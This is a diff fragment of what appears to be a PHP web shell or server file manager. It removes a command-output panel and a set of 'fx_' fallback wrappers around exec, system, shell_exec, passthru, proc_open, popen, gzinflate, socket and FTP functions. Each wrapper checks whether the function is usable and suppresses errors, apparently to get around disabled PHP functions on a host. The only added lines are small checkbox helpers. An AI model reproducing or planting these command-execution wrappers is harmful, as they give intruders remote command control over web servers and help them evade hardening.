-      if (form) { form.addEventListener('submit', function(){ cmCmd.save(); }); }
-
-      setTimeout(function(){ cmCmd.refresh(); }, 50);
-      window.addEventListener('resize', function(){ cmCmd.refresh(); });
-    })();
-
-    // ===== CodeMirror untuk COMMAND OUTPUT =====
-    (function(){
-      var pre = document.getElementById('cmdOutPre');
-      if(!pre || typeof CodeMirror === 'undefined') return;
-
-      CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
-      var isWin = <?php echo je(DIRECTORY_SEPARATOR === '\\'); ?>;
-      var outMode = isWin ? 'powershell' : 'shell';
-
-      var txt = pre.textContent || '';
-      var holder = document.createElement('div');
-      pre.parentNode.replaceChild(holder, pre);
-
-      var cmOut = CodeMirror(holder, {
-        value: txt,
-        readOnly: true,
-        lineNumbers: true,
-        lineWrapping: true,
-        theme: 'material-darker',
-        mode: outMode,
-        viewportMargin: Infinity
-      });
-
-      CodeMirror.autoLoadMode(cmOut, outMode);
-      cmOut.setSize('100%', 380);
-      cmOut.getWrapperElement().classList.add('cm-cmd-output');
-
-      setTimeout(function(){ cmOut.refresh(); }, 50);
-      window.addEventListener('resize', function(){ cmOut.refresh(); });
-    })();
+    function toggleAll(m){ document.querySelectorAll('.rowchk').forEach(x => x.checked = m.checked); }
+    function selectAll(f){ document.querySelectorAll('.rowchk').forEach(x => x.checked = f); document.getElementById('chkAll').checked = f; }
+    function toggleRow(id){ document.getElementById(id).classList.toggle('hidden'); }
   </script>
 </body>
 </html>
-<?php
-/* ============================================================
- * OPTIONAL WRAPPERS (fx_*) if you need replacements elsewhere
- * ============================================================ */
-
-/* stream_socket_client fallback via fsockopen */
-if (!function_exists('fx_stream_socket_client')) {
-    function fx_stream_socket_client($remote_socket, &$errno=null, &$errstr=null, $timeout=30, $flags=0, $context=null) {
-        if (is_fn_usable('stream_socket_client')) {
-            return @stream_socket_client($remote_socket, $errno, $errstr, $timeout, $flags, $context);
-        }
-        if (is_fn_usable('fsockopen')) {
-            $host = $remote_socket; $port = 0;
-            if (stripos($remote_socket, 'tcp://') === 0 || stripos($remote_socket, 'ssl://') === 0 || stripos($remote_socket, 'tls://')===0) {
-                $tmp = parse_url($remote_socket);
-                if ($tmp && isset($tmp['host']) && isset($tmp['port'])) { $host=$tmp['host']; $port=$tmp['port']; }
-            } else if (strpos($remote_socket, ':') !== false) {
-                $parts = explode(':',$remote_socket,2); $host=$parts[0]; $port=(int)$parts[1];
-            }
-            return @fsockopen($host, $port ? $port : 80, $errno, $errstr, $timeout);
-        }
-        $errno = 0; $errstr = 'No socket functions available';
-        return false;
-    }
-}
-
-if (!function_exists('fx_ini_restore')) {
-    function fx_ini_restore($varname) {
-        if (is_fn_usable('ini_restore')) return @ini_restore($varname);
-        return false; // no-op
-    }
-}
-
-if (!function_exists('fx_gzinflate')) {
-    function fx_gzinflate($data, $length = 0) {
-        if (is_fn_usable('gzinflate')) return @gzinflate($data, $length);
-        if (is_fn_usable('gzdecode')) return @gzdecode($data);
-        if (is_fn_usable('gzuncompress')) return @gzuncompress($data);
-        return false;
-    }
-}
-
-if (!function_exists('fx_exec')) {
-    function fx_exec($cmd, &$output=null, &$return_var=null) {
-        if (is_fn_usable('exec')) return @exec($cmd, $output, $return_var);
-        $output = array(); $return_var = 127; return null;
-    }
-}
-if (!function_exists('fx_passthru')) {
-    function fx_passthru($cmd, &$return_var=null) {
-        if (is_fn_usable('passthru')) return @passthru($cmd, $return_var);
-        $return_var = 127; return null;
-    }
-}
-if (!function_exists('fx_shell_exec')) {
-    function fx_shell_exec($cmd) {
-        if (is_fn_usable('shell_exec')) return @shell_exec($cmd);
-        return null;
-    }
-}
-if (!function_exists('fx_system')) {
-    function fx_system($cmd, &$return_var=null) {
-        if (is_fn_usable('system')) return @system($cmd, $return_var);
-        $return_var = 127; return null;
-    }
-}
-if (!function_exists('fx_proc_open')) {
-    function fx_proc_open($cmd, $descriptorspec, &$pipes, $cwd=null, $env=null) {
-        if (is_fn_usable('proc_open')) return @proc_open($cmd, $descriptorspec, $pipes, $cwd, $env);
-        return false;
-    }
-}
-if (!function_exists('fx_popen')) {
-    function fx_popen($cmd, $mode) {
-        if (is_fn_usable('popen')) return @popen($cmd, $mode);
-        return false;
-    }
-}
-
-if (!function_exists('fx_parse_ini_file')) {
-    function fx_parse_ini_file($filename, $process_sections = false, $scanner_mode = null) {
-        if (is_fn_usable('parse_ini_file')) {
-            if ($scanner_mode === null) return @parse_ini_file($filename, $process_sections);
-            return @parse_ini_file($filename, $process_sections, $scanner_mode);
-        }
-        $s = @file_get_contents($filename);
-        if ($s === false) return false;
-        if (is_fn_usable('parse_ini_string')) return @parse_ini_string($s, $process_sections);
-        return false;
-    }
-}
-
-if (!function_exists('fx_show_source')) {
-    function fx_show_source($file, $return=false) {
-        if (is_fn_usable('show_source')) return @show_source($file, $return);
-        if (is_fn_usable('highlight_file')) return @highlight_file($file, $return);
-        $c = @file_get_contents($file);
-        if ($return) return $c;
-        echo $c; return true;
-    }
-}
-
-if (!function_exists('fx_scandir')) {
-    function fx_scandir($dir) {
-        if (is_fn_usable('scandir')) return @scandir($dir);
-        $h = @opendir($dir); if (!$h) return false;
-        $out = array(); while(false!==($e=readdir($h))) $out[]=$e; closedir($h); return $out;
-    }
-}
-
-if (!function_exists('fx_posix_getpwuid')) {
-    function fx_posix_getpwuid($uid) {
-        if (is_fn_usable('posix_getpwuid')) return @posix_getpwuid($uid);
-        return array('name'=>@get_current_user(), 'uid'=>$uid);
-    }
-}
-if (!function_exists('fx_posix_getgrgid')) {
-    function fx_posix_getgrgid($gid) {
-        if (is_fn_usable('posix_getgrgid')) return @posix_getgrgid($gid);
-        return array('name'=>'unknown','gid'=>$gid);
-    }
-}
-
-if (!function_exists('fx_diskfreespace')) {
-    function fx_diskfreespace($directory) {
-        if (is_fn_usable('diskfreespace')) return @diskfreespace($directory);
-        if (is_fn_usable('disk_free_space')) return @disk_free_space($directory);
-        return false;
-    }
-}
-
-if (!function_exists('fx_filegroup')) {
-    function fx_filegroup($filename) {
-        if (is_fn_usable('filegroup')) return @filegroup($filename);
-        return false;
-    }
-}
-
-if (!function_exists('fx_ftp_connect')) {
-    function fx_ftp_connect($host, $port=21, $timeout=90) {
-        if (is_fn_usable('ftp_connect')) return @ftp_connect($host, $port, $timeout);
-        if (is_fn_usable('fsockopen')) return @fsockopen($host, $port, $errno, $errstr, $timeout);
-        return false;
-    }
-}
-
-if (!function_exists('fx_stream_get_contents')) {
-    function fx_stream_get_contents($handle, $maxlength = -1, $offset = -1) {
-        if (is_fn_usable('stream_get_contents')) return @stream_get_contents($handle, $maxlength, $offset);
-        if ($offset > 0) @fseek($handle, $offset);
-        $data = '';
-        if ($maxlength === -1) {
-            while(!feof($handle)) { $data .= @fread($handle, 8192); }
-        } else {
-            $data = @fread($handle, $maxlength);
-        }
-        return $data;
-    }
-}
